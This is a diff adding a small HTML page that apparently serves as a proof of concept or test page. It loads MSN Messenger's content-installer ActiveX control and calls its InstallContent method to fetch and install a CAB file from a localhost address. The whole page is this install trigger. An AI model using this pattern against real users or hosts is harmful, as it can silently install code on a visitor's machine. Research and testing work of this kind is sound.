@@ -1,0 +1,29 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+
+<head>
+    <title>Content install</title>
+    <meta charset="UTF-8">
+</head>
+
+<body>
+    <object id="MessengerContentInstaller" height="0" width="0" classid="clsid:F06608C7-1874-4EEA-B3B2-DF99EBB144B8"
+        codetype="application/x-oleobject" VIEWASTEXT> </object>
+
+    <a href="javascript:InstallContent('http\:\/\/127.0.0.1:8081\/TFR375.cab')">INSTALL</a>
+    <button onclick="InstallContent('http\:\/\/127.0.0.1:8081\/TFR375.cab')">INSTALL</button>
+
+    <script language="jscript">
+
+        
+
+        function InstallContent(strURL) {
+            var activeX = new ActiveXObject("MSNMessenger.MessengerContentInstaller");
+            activeX.InstallContent(strURL);
+        }
+    </script>
+</body>
+
+
+
+</html>
